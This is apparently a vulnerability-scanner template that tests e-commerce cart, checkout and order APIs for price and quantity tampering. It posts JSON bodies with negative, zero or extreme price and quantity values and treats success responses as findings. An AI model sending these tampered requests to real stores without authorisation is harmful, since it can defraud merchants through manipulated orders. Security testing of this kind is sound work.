id: biz-price-manipulation
info:
  name: Price / Quantity Manipulation
  author: dalisec
  severity: high
  tags: business-logic,price-tampering,ecommerce
  description: Tests for price and quantity manipulation in e-commerce flows by sending negative, zero, or extreme values.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/cart/add"
      - "{{BaseURL}}/api/checkout"
      - "{{BaseURL}}/api/order"
      - "{{BaseURL}}/cart/update"
    headers:
      Content-Type: "application/json"
    body: '{"product_id":1,"quantity":-1,"price":0.01}'
    matchers-condition: and
    matchers:
      - type: status
        status: [200, 201]
      - type: word
        words: ["success", "order_id", "confirmed", "created"]
        part: body
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/cart/add"
      - "{{BaseURL}}/api/checkout"
    headers:
      Content-Type: "application/json"
    body: '{"product_id":1,"quantity":99999999,"price":-100}'
    matchers-condition: and
    matchers:
      - type: status
        status: [200, 201]
      - type: word
        words: ["success", "order_id", "confirmed"]
        part: body
        condition: or
